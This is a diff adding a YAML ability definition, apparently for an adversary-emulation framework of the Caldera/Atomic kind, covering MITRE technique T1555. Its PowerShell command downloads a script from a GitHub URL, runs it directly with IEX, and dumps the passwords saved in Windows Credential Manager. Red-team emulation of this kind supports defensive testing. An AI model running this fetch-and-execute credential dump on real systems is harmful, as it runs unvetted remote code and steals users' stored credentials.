@@ -1,0 +1,17 @@
+- description: This module will extract the credentials from Windows Credential Manager
+  id: 9d0478981edda6091f911a1305025bde
+  name: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1'
+          -UseBasicParsing); Get-CredManCreds -Force
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1555
+    name: Credentials from Password Stores
